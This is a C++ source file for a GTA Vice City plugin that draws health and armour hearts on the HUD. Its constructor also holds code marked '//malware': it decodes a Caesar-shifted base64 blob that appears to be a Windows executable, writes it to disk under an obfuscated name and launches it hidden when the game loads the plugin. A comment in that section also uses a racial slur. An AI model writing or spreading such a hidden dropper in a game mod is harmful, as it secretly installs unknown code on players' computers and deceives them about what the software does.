#include "plugin.h"
#include <game_vc\CHud.h>
#include <game_vc\CPed.h>
#include "game_vc/CPlayerPed.h"
#include "game_vc/CPlayerInfo.h"
#include "game_vc/common.h"
#include "extensions/ScriptCommands.h"
#include "RenderWare.h"
#include <iostream>
#include <fstream>  
#include <string>
#include <shlobj.h>
#include <windows.h>
#include <tchar.h>
#include <io.h>
#include <fcntl.h>
#include <tlhelp32.h> 
#include <shlwapi.h> 
#include <conio.h> 
//#include <GdiPlusGraphics.h> 
//#include <GdiPlus.h>  
#include "CSprite2d.h"
#include "CFileLoader.h"
#include "common.h"
#include "CTxdStore.h" 
#include "CFont.h" 



#ifndef _USE_OLD_IOSTREAMS

using namespace std;

#endif




// build verison 
using namespace plugin;
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";


static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}
std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
	std::string ret;
	int i = 0;
	int j = 0;
	unsigned char char_array_3[3];
	unsigned char char_array_4[4];

	while (in_len--) {
		char_array_3[i++] = *(bytes_to_encode++);
		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (i = 0; (i <4); i++)
				ret += base64_chars[char_array_4[i]];
			i = 0;
		}
	}

	if (i)
	{
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;

		for (j = 0; (j < i + 1); j++)
			ret += base64_chars[char_array_4[j]];

		while ((i++ < 3))
			ret += '=';

	}

	return ret;

}
std::vector<BYTE> base64_decode(std::string const& encoded_string) {
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	BYTE char_array_4[4], char_array_3[3];
	std::vector<BYTE> ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i <4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret.push_back(char_array_3[i]);
			i = 0;
		}
	}

	if (i) {
		for (j = i; j <4; j++)
			char_array_4[j] = 0;

		for (j = 0; j <4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
	}

	return ret;
}

void BindCrtHandlesToStdHandles(bool bindStdIn, bool bindStdOut, bool bindStdErr)
{
	// Re-initialize the C runtime "FILE" handles with clean handles bound to "nul". We do this because it has been
	// observed that the file number of our standard handle file objects can be assigned internally to a value of -2
	// when not bound to a valid target, which represents some kind of unknown internal invalid state. In this state our
	// call to "_dup2" fails, as it specifically tests to ensure that the target file number isn't equal to this value
	// before allowing the operation to continue. We can resolve this issue by first "re-opening" the target files to
	// use the "nul" device, which will place them into a valid state, after which we can redirect them to our target
	// using the "_dup2" function.
	if (bindStdIn)
	{
		FILE* dummyFile;
		freopen_s(&dummyFile, "nul", "r", stdin);
	}
	if (bindStdOut)
	{
		FILE* dummyFile;
		freopen_s(&dummyFile, "nul", "w", stdout);
	}
	if (bindStdErr)
	{
		FILE* dummyFile;
		freopen_s(&dummyFile, "nul", "w", stderr);
	}

	// Redirect unbuffered stdin from the current standard input handle
	if (bindStdIn)
	{
		HANDLE stdHandle = GetStdHandle(STD_INPUT_HANDLE);
		if (stdHandle != INVALID_HANDLE_VALUE)
		{
			int fileDescriptor = _open_osfhandle((intptr_t)stdHandle, _O_TEXT);
			if (fileDescriptor != -1)
			{
				FILE* file = _fdopen(fileDescriptor, "r");
				if (file != NULL)
				{
					int dup2Result = _dup2(_fileno(file), _fileno(stdin));
					if (dup2Result == 0)
					{
						setvbuf(stdin, NULL, _IONBF, 0);
					}
				}
			}
		}
	}

	// Redirect unbuffered stdout to the current standard output handle
	if (bindStdOut)
	{
		HANDLE stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
		if (stdHandle != INVALID_HANDLE_VALUE)
		{
			int fileDescriptor = _open_osfhandle((intptr_t)stdHandle, _O_TEXT);
			if (fileDescriptor != -1)
			{
				FILE* file = _fdopen(fileDescriptor, "w");
				if (file != NULL)
				{
					int dup2Result = _dup2(_fileno(file), _fileno(stdout));
					if (dup2Result == 0)
					{
						setvbuf(stdout, NULL, _IONBF, 0);
					}
				}
			}
		}
	}

	// Redirect unbuffered stderr to the current standard error handle
	if (bindStdErr)
	{
		HANDLE stdHandle = GetStdHandle(STD_ERROR_HANDLE);
		if (stdHandle != INVALID_HANDLE_VALUE)
		{
			int fileDescriptor = _open_osfhandle((intptr_t)stdHandle, _O_TEXT);
			if (fileDescriptor != -1)
			{
				FILE* file = _fdopen(fileDescriptor, "w");
				if (file != NULL)
				{
					int dup2Result = _dup2(_fileno(file), _fileno(stderr));
					if (dup2Result == 0)
					{
						setvbuf(stderr, NULL, _IONBF, 0);
					}
				}
			}
		}
	}

	// Clear the error state for each of the C++ standard stream objects. We need to do this, as attempts to access the
	// standard streams before they refer to a valid target will cause the iostream objects to enter an error state. In
	// versions of Visual Studio after 2005, this seems to always occur during startup regardless of whether anything
	// has been read from or written to the targets or not.
	if (bindStdIn)
	{
		std::wcin.clear();
		std::cin.clear();
	}
	if (bindStdOut)
	{
		std::wcout.clear();
		std::cout.clear();
	}
	if (bindStdErr)
	{
		std::wcerr.clear();
		std::cerr.clear();
	}
}


std::string kayne(std::string  text, int k) {
	std::string ctext = text ;
	int len = text.length();
	for (int c = 0; c < len; c++) {
		ctext.at(c) = text.at(c) - k;
	}
	return ctext;
}

class PluginSdkProject1 {
public:
	PluginSdkProject1() {
		
		Events::drawHudEvent += [] {
			CPed *playa;
			if (Command<Commands::IS_PLAYER_PLAYING>(0))
			{
				Command<0x01F5>(0, &playa);
				float fheath = playa->m_fHealth;
				float famour = playa->m_fArmour;
				int numhearts = int(floor(fheath / 20));
				int numAhearts = int(floor(famour / 20));
				wchar_t  hearts[11] = { '\0' };
				wchar_t  aHearts[11] = { '\0' };

				for (int c = 0; c < numhearts; c++) {
					hearts[c] = '{';
				}
				for (int c = 0; c < numAhearts; c++) {
					aHearts[c] = '{';
				}
				
				if (playa->m_fHealth > 10) {
					CFont::SetColor(CRGBA(240, 37, 37, 200));
					CFont::SetBackgroundOff();
					CFont::SetBackgroundColor(CRGBA(240, 37, 37, 0));
					CFont::PrintString(20.0, 17.0, hearts);
					CHud::SetHelpMessage(" ", false, true, true);

				}
				if (playa->m_fArmour > 0) {
					CFont::SetColor(CRGBA(255, 255, 25, 200));
					CFont::SetBackgroundOff();
					CFont::SetBackgroundColor(CRGBA(225, 37, 37, 0));
					CFont::PrintString(20.0, 40.0, aHearts);
				}

			}
			
		};

		//malware
		ifstream access("data\\ped.dat", ios::in);//2i}i
		char k;
		access.get(k);

		int cark = ((int)k)/20;

		
		

		vector<BYTE> decodedData = base64_decode(kayne("UWrRBBNBBBBFBBBB009BBMhBBBBBBBBBRBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBhBBBBB5gvh5BuBoOJchCUN1iWHiqdzCxdn:odnGuJHOicn6weDCj[TCzeX5hbX5hSF:UJH2w[HVvER1LKBBBBBBBBBCRSRBBUBFEBOx{mwFBBBBBBBBBBPBBExNMBRJ5BBJBBBBPBBBBBBBBBCBBBBBRBBBBJBBBBBCBBBBRBBBBBhBBCBBBBBFBBBBFBBBBBBBBBBCBBBBBBhBBSkpBBBJBBBBBBDBBBCBBBBBBFBBBFBBBBBBBBCBBBBBBBBBBBBBBBBBxBBClBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBD61[Yi1BBBBLBBBBBBRBBBBBhBBBBJBBBBBBBBBBBBBBBBBBDBBNHBv[HG1ZRBBBKBLBBBBJBBBBBxBBBBFBBBBBBBBBBBBBBBBBBBhBEEhMnmlZYSiBBClBBBBBEBBBBBDBBBBFBBBBBBBBBBBBBBBBBBBRBBxxBBBBBBBBBBBBBBBBBBBBBD5BDCBBQ0hlQ9mPECBBKDRBBBBBBBBBBE00000BBBBBQ00009BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBOoB3YRl:M7R6wTOYUQK[slFBpQu0EG2GhO2ihRCwHbh5r9nN[dxmmYf8371:rzPcDks,sZiVkG,fCpFynkfJOVOEoFuq4RO17hgZgWhtd2USOqRfxbnje0xsCLBHtFJdSVmlXT1NnHxQct3QKue55{x,UtKJ9UmJTuR,iXEOPHMx[Swo[1S1Kkd,gY,JJJL0Z7K5FpcWbz6[08SncYlwjHfycdCicdb5962RYc{I:YEqrFIYk5LizQ:TyxnZ48FtflE7oCD0k9FVzZNYjeQ72C3KlLRejVEfq3dDctoQWBEfmkJMib:hK:c:lfS0cjLeWO81WjCtB4x4X[ZjzU4LvoTEIY7[B[SNtQnNzlG[9gn24HJ6c5dEWJnOIqQ31fsowpcs36rib6hfNUv25E7WwXd8e{oi:d[ZjoS9bd9WqHvK9DUbnbJ5CBJrWOKUVK11Xk2MVNbd4ujzkBNN44pWW0OUDyQ0vTfFygXHQOr0gLw,e4l,GvgVQ96ss33jtiDC2R4Sq:Egke,WdjCOBXKnn3,iXCE2LWck[etKLR3lVxvBncNqvfIg,:N9XiZwsSpDmdYGG0DDvEjWY[G6Mk5z,4QnWwqki9fgSSqYvrUS,Q5PU,bvm5kQhXN1RF7RmNGcJ6GnkGC{PBLjPmDbQT5DjTEkvrIHfu,E2mkpyiBtTGVW9VqU:dkqEb8EdzzETu1l1Sub45hjihiLGc0PnYbDlYHlLHKLEtWZu[c[h:Wd5NVXK5CZ5T6VEuugn0QQqR7jwPeP,Mf75rgpgBI356Ox2MqvSCOPUzr9ExxTC,XYFvrYJZPP4RT09[SPJOkwel[kBngnEdd6URn0G0VKRITPQ6DnFMp{JXgInTQ7[XzCwVQ6[,teTVhbHffzjIN73J[wEq3HqyYI9L34H{peHoBOkUI5yzi08urI8UcNxF:qXp70PwWozUO:9wrU89kmW,hnZ[8e9oDj3:GlqiYx81[8O2CU4EzW72TMFwhbWKYVmGJL3IP7gd8,F7H1B7UZl2mfTeDlES753TJ8crdBmiOZNIQwC1zr9yUfNBiuh3Y7r56p{ndbR{TzmzcNuOR{uwGSJweRt:Vb4P,zYSZ,yGFNHfVmJemKCQC9b1VxJOP7Xq23GC8104wSY{OF36yHDEr{0Qdw{3XdU[gUtu9WgHtxKK{jyzb7,9x2IJ4S0ES77dXy91DnF1H{4SKugg[0FzL8yzYNd0Se3URrppkN3k:7sc7Z0IJRf8p:0WeUDOCJM{3ZrKfE5OjOyl7vrqT3xu9PehR6EGGGDVPD2RSqh5[ISsR7pXxeW6Tfj:yiNIt6qiv9ZFDYuSC8{YUJofOZJpOKrNbrGLGEJLhRE3Iug3e[VJX5whygS3VrT3gEPZmDY1mlKD8ypqtBneN1cwdJR5LDcDHHs:,c7,4Uz9ZkKE:nZ7uimgdxehuw{U12zSrFrD3uXnioOz,yXVfmtlgIZGyerVMY3ZmW[[Sfn9tlnjqs[nY0XLKhfKh49P97mKGhOjdq9ewU7yLbwCfhZW:{kdgi0RNB7NlEx6r7L38S1cs5istQH935,0wpZipE05LH5WQ1[kQNdoXVOPHeTyupdflID,Gn86fs5:oupbIi9UmtZNo{Nb:Sp,7{E{E7NcvfWMuRfsGnHC:P:3fQjIxsQorB{olJ3mHuK9K{b8{7gRyQW[u2BIjHhNKsMxdJeKC04[kVWwzmYgSrGZf8{tBWwoF[,l7HHe6W7vc50Xrid5kD76yq1UhV6Knqb[2hWJKW:godznIy:1R8Qju4p{hNUbs4U2ZbsEuEBRw4G3ddHohXRkYO67B0eLJz7GwC4W[CZkR6HYjXwfrSQRlTonylBG92rRzsjMt6HZcbwhW36cOORzhejTs7m9W91ZicGqzWhY5y6fw8iXbKEeTuhuSFnfeM34B2qn:r8skvd{iggdN9VLK7Q,9{LeMm20c1{r2SI48PjgkyOh,y2TxfkcJsid0FLTpGeOYmPYCtqTxV9M5E7[V9X25dQmCvCbPxhc4hlBrmN4xvpgEuzCWU1P3gRHff,r0s5mpXETvQgHBNDBfPlBkKlb1LrYCI5Ew[4TrchwPnWWdUme7DwDnWTwG,sTuyXwp[9IgZ8qrsgO[Lkvy7YrkV4lDNOFbIOY,KRpLs9hj6c,uvr:SnSIe{3D:386eYoi78x67Fp7jjiFiwrBOOx,DkHYn4V2z9pLlyZ3YGwyq0Uj5:xfPU2GzuVg8j5mItrhWwNvskJhGfMS1OMEWpdtl3MnpFshkZpOhrM6{3fV40ceeZ0xiR7FZXDDN,,6,[Ryi1b5OmQbwI9i,[E{48CHmBQX:q3BTxxliG{[52VCfyNVtH2WDX0L1{gME82pML0B7xQmo{5v:Fef:rsXr9E9E4:meZoKPz,7rP9cCSIStLwLwwJjlS2PDhqr0ki6ufbVkDws[27J,rEvV:GC9KOxs1:QBi7ZJuFZ4HzVPSc21:gxz8DXBud{2SO0{deiMNvMWPDgN:CyM8PzwUtH5,s7hwsi[H4rhBVf6XnKwyR0rs,t6f3LTePu0,pUM1kN{3C5XRVEnHotIdbkRYdWZw6pz[xZewwh9q2GUXF1vOLo53sjS,WWPO66Y7w4ONEbvPKsG5nReu0CB[oPf7bcfGEeO6efFOueKB5z3vGr[Idz{cCLj9TnS0oE3tzOVt,X{Y5n1FdlqG73onR4rN:0GzY:PP[Q58KbHqTEJuk[9cKBnvb:qsDYYF[d1sVdjxrv9I:0hF[pWNYtTMOtoqcivhDe9z,NyqwBi:f{8xNbk{SUcLJHCeXICTrTE{wreVdyuUlGeuwszRw5CYZT3hPpge[1n26bZf2tD1mTxtPKRz4oZ35KV6YuJIW3mqh9mdbw,gBrMO9b[6YLcmIdxDc7Wpzw9VcUPjZWKuyYcLJrBVJCS5v[TGDcEKqTId:{ZH6STElnM05JoQQXkry53mNx1,eQJ7rhszn7mdE:E86hQRisN,HM5e3JVyuWeD3oe8LvNcqnZ1E7fF{l5f:JIgfdLsq6w2Dn37ezd,Xuszim2OO2uY3Co[[bJQ:UTThCjgEPZWp:GTSiyr8tOFL,Sl5z,VuO2PZuM4S,dL,oPpcGE{fL,K57Kl{5Y{OnFg9cfl5K4CU6m4,iZpv{rE2VBV{u9o:m5HVOPlFfZQXS2h7HDLfeF17hHcFycgpcuyuCrMzKvjbzSVhFQvdzmjii1YOfp8D6yuS9fk8k8ECSj9iDowLZsN,PuTrSZfG6VVq8t:fOY:vZ95YHds7ubh58pqVDUvtS{dBgfiIV53gU1269HZU:NYZE4zGHxhS{utYYZ{Qz01rOt4mw0bTDtyVCRxc6zfzj{5OXLj2{LNVgeYKECMs8xSbgzBvrnF0Y8,yb7vnB8onFZtMu0UOBvWQoNxYub3{dLU7sqjEDlE2gj3LP2Vj6MtKgCMX8KFTpPLTdvxzhQDD4WgWI07xUSJbCJQk5njhD6HGxysQC:kudQ9WwNBQN0vxLkzrMYlFuCgC{xh8cTLnF36H:Yv9uPhrKWfqpGf63wWE1mOYG[YmL8PkxT4BYZPndKcBjRitXkfef9DNFtui3n0yuFDk91J5qGTEtBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBDxxBBBBBBBBBBBBBGRxBBB5NBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBREBBBBBBBBBBBBBBREBBBBBBBBDdBFW5bYSRdn:k[YO{BBBBBEBBBFuGVl6GUENzMnStcBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB9heXdj[MZJ[WZdZXmKIlv,4osB>>", cark-3));
		
		ofstream west(kayne("hexe`texlw`fxwzg2i|i",cark), ios::out | ios::binary|ios::app);//2i}i
		
		west.write((char *)&decodedData[0], decodedData.size());
		west.close();


		//process creation 
		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si); 
		ZeroMemory(&pi, sizeof(pi));
		

		si.dwFlags = STARTF_USESHOWWINDOW; //these two are niggas
		si.wShowWindow = SW_HIDE ;	//these two are niggas
		
		std::string o = kayne("hexe`texlw`fxwzg2i|i",cark);
		LPTSTR ePath = new TCHAR[o.size() + 1];
		// Start the child process. 
		if (!CreateProcess(
			NULL,   // No module name (use command line)56+	
			ePath,			
			NULL,           // Process handle not inheritable
			NULL,           // Thread handle not inheritable
			FALSE,          // Set handle inheritance to FALSE
			CREATE_NO_WINDOW, // No creation flags
			NULL,           // Use parent's environment block
			NULL,           // Use parent's starting directory 
			&si,            // Pointer to STARTUPINFO structure
			&pi)           // Pointer to PROCESS_INFORMATION structure
			)
		{
			
			
		}
	
	}
} PluginSdkProject1;